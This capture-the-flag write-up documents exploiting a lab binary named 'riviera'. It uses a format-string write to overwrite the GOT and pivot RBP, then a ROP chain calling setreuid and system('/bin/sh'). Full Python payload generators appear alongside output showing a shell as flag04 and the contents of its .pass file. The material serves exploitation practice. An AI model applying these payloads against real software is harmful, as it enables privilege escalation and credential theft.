## Infos on the binary

```shell
level04@rainfall:~$ checksec riviera
[*] '/home/level04/riviera'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Same as level03 protections, no executable stack

For this one, we've tried several approaches.
the first one was to overwrite the **GOT address** of the `printf` function to replace it with the address of `system`
so that on the next call of `printf(<our_buffer>)` it replaces it with `system(<our_buffer>)`.

we've managed to do that with the following payload:
```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"sh;#%34636x%10$hn%28789x%11$hn\n" + b"\x10\x40\x40\x00\x00\x00\x00\x00\x12\x40\x40\x00\x00\x00\x00\x00" + b"\n")' > /tmp/t
```

it worked, but we needed a way to add `-p` to the shell spawn in order to avoid security check on uids. Sadly the buffer size was only 32 chars and we did not have the space to add other characters. 

So, we changed our approach.
We decided to do a "mix" between the solution to the previous exercise, and the above attempt. 

The goal was to replace RBP address with the address of the second buffer (MSG) and to place our ROP Gadgets inside this second buffer. 
In order to do so, we first inserted the address of RBP at the beggining of the second buffer:
```bash
...
msg: \x70\xe1\xff\xff\xff\x7f\x00\x00 # (0x7fffffffe170)
... 
```
From the previous attempt, we knew that the start of the msg buffer was at **offset 10** on the stack, so we could access it in printf with `%10`. With `%10$hn` we can write at the address stored by the message buffer. 
Printf writes the number of character it as printed by now in the address pointed by the parameter. We can trick printf to write almost any number we want using the pattern `%<desired_number>x`. In our case, we needed to replace `0x7fffffffe170` by `0x7fffffffe180` so just writing `e180` at the end was enough. 
We now just needed to convert `e180` to decimal : `57728`.
The final tag buffer:
```bash
...
tag: %57728x%10$hn
...
```

For the ROP Gadget, we just took the one from the previous exercise and added them to the MSG buffer:
```bash
python3 -c 'import sys, struct
p64 = lambda x: struct.pack("<Q", x)

payload = p64(0x7fffffffe170)   #rbp address
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1021)             # uid de flag04
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1021)             # uid de flag04
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
sys.stdout.buffer.write(b"%57728x%10$hn\n"); sys.stdout.buffer.write(payload + b"\n")' > input
```

Then : 
```bash
(cat input; cat) | ./riviera
  [RIVIERA] What you see is not what is.
  [RIVIERA] Holographic logging system v1.9
[RIVIERA] Tag: [RIVIERA] Message: [RIVIERA] [0] tag=
...
...
whoami
flag04
cat /home/flag04/.pass
x0w8xdgapz3tjopq2s11a27yro7krazm
```

Success !